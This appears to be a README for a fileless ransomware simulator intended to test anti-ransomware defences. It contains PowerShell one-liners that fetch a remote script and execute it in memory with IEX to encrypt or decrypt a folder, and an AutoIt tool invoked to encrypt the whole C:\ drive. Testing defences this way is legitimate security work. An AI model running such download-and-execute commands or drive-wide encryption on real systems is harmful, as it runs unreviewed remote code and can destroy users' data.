# RansomSimulator

Fileless ransomware simulator - to evaluate your anti-ransomware mitigation technology

**Example:**

Encryption - 

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';

Decryption - 

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';

# Bonus
An autoIt script - you may compile it to an executable using Aut2Exe, or execute it using the interpreter

**Example:**

Encryption - 

RansomSIM.exe /encrypt C:\
  
Decryption - 

RansomSIM.exe /decrypt C:\


